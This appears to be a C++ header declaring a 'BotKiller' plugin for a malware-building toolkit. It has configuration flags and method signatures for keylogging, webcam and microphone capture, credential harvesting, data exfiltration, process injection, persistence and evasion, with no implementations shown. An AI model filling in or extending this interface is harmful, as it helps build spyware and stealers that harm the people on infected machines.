#pragma once
#include <string>
#include <vector>

// Configuration structure for bot killer functionality
struct BotKillerConfig {
    bool useProcessKilling;
    bool useServiceKilling;
    bool useRegistryCleaning;
    bool useFileDeletion;
    bool useNetworkBlocking;
    bool useAntiAnalysis;
    bool useEvasion;
    bool usePersistence;
    bool useCommandExecution;
    bool useFileOperations;
    bool useNetworkOperations;
    bool useRegistryAccess;
    bool useProcessInjection;
    bool useDLLLoading;
    bool useShellExecution;
    bool useKeylogging;
    bool useScreenshot;
    bool useWebcamAccess;
    bool useMicrophoneAccess;
    bool useClipboardAccess;
    bool useSystemInfo;
    bool useCredentialHarvesting;
    bool useDataExfiltration;
    bool useSocialEngineering;
    bool useObfuscation;
    bool useEncryption;
};

// Bot Killer Plugin Interface
class BotKiller {
private:
    BotKillerConfig config;

    // Utility functions
    std::string generateProcessKiller();
    std::string generateServiceKiller();
    std::string generateRegistryCleaner();
    std::string generateFileDeleter();
    std::string generateNetworkBlocker();
    std::string generateAntiAnalysis();
    std::string generateEvasion();
    std::string generatePersistence();
    std::string generateCommandExecution();
    std::string generateFileOperations();
    std::string generateNetworkOperations();
    std::string generateRegistryAccess();
    std::string generateProcessInjection();
    std::string generateDLLLoading();
    std::string generateShellExecution();
    std::string generateKeylogging();
    std::string generateScreenshot();
    std::string generateWebcamAccess();
    std::string generateMicrophoneAccess();
    std::string generateClipboardAccess();
    std::string generateSystemInfo();
    std::string generateCredentialHarvesting();
    std::string generateDataExfiltration();
    std::string generateSocialEngineering();
    std::string generateObfuscation();
    std::string generateEncryption();

    // Menu handlers
    void handleProcessKiller();
    void handleServiceKiller();
    void handleRegistryCleaner();
    void handleFileDeleter();
    void handleNetworkBlocker();
    void handleAntiAnalysis();
    void handleEvasion();
    void handlePersistence();
    void handleCommandExecution();
    void handleFileOperations();
    void handleNetworkOperations();
    void handleRegistryAccess();
    void handleProcessInjection();
    void handleDLLLoading();
    void handleShellExecution();
    void handleKeylogging();
    void handleScreenshot();
    void handleWebcamAccess();
    void handleMicrophoneAccess();
    void handleClipboardAccess();
    void handleSystemInfo();
    void handleCredentialHarvesting();
    void handleDataExfiltration();
    void handleSocialEngineering();
    void handleObfuscation();
    void handleEncryption();
    void handleConfiguration();

public:
    BotKiller();
    ~BotKiller();

    // Plugin interface methods
    std::string getName() const;
    std::string getDescription() const;
    std::string getVersion() const;
    bool initialize();
    void execute();
    std::vector<std::string> getOptions() const;
    void setOption(const std::string& option, const std::string& value);

    // Bot Killer Methods
    std::string createProcessKiller(const std::string& type, const std::string& features);
    std::string createServiceKiller(const std::string& type, const std::string& features);
    std::string createRegistryCleaner(const std::string& type, const std::string& features);
    std::string createFileDeleter(const std::string& type, const std::string& features);
    std::string createNetworkBlocker(const std::string& type, const std::string& features);
    std::string createAntiAnalysis(const std::string& type, const std::string& features);
    std::string createEvasion(const std::string& type, const std::string& features);
    std::string createPersistence(const std::string& type, const std::string& features);
    std::string createCommandExecution(const std::string& type, const std::string& features);
    std::string createFileOperations(const std::string& type, const std::string& features);
    std::string createNetworkOperations(const std::string& type, const std::string& features);
    std::string createRegistryAccess(const std::string& type, const std::string& features);
    std::string createProcessInjection(const std::string& type, const std::string& features);
    std::string createDLLLoading(const std::string& type, const std::string& features);
    std::string createShellExecution(const std::string& type, const std::string& features);
    std::string createKeylogging(const std::string& type, const std::string& features);
    std::string createScreenshot(const std::string& type, const std::string& features);
    std::string createWebcamAccess(const std::string& type, const std::string& features);
    std::string createMicrophoneAccess(const std::string& type, const std::string& features);
    std::string createClipboardAccess(const std::string& type, const std::string& features);
    std::string createSystemInfo(const std::string& type, const std::string& features);
    std::string createCredentialHarvesting(const std::string& type, const std::string& features);
    std::string createDataExfiltration(const std::string& type, const std::string& features);
    std::string createSocialEngineering(const std::string& technique, const std::string& target);
    std::string addObfuscation(const std::string& payload);
    std::string addEncryption(const std::string& payload, const std::string& key);

    // Configuration methods
    void setUseProcessKilling(bool use);
    void setUseServiceKilling(bool use);
    void setUseRegistryCleaning(bool use);
    void setUseFileDeletion(bool use);
    void setUseNetworkBlocking(bool use);
    void setUseAntiAnalysis(bool use);
    void setUseEvasion(bool use);
    void setUsePersistence(bool use);
    void setUseCommandExecution(bool use);
    void setUseFileOperations(bool use);
    void setUseNetworkOperations(bool use);
    void setUseRegistryAccess(bool use);
    void setUseProcessInjection(bool use);
    void setUseDLLLoading(bool use);
    void setUseShellExecution(bool use);
    void setUseKeylogging(bool use);
    void setUseScreenshot(bool use);
    void setUseWebcamAccess(bool use);
    void setUseMicrophoneAccess(bool use);
    void setUseClipboardAccess(bool use);
    void setUseSystemInfo(bool use);
    void setUseCredentialHarvesting(bool use);
    void setUseDataExfiltration(bool use);
    void setUseSocialEngineering(bool use);
    void setUseObfuscation(bool use);
    void setUseEncryption(bool use);

    // Menu interface
    void showMenu();
};
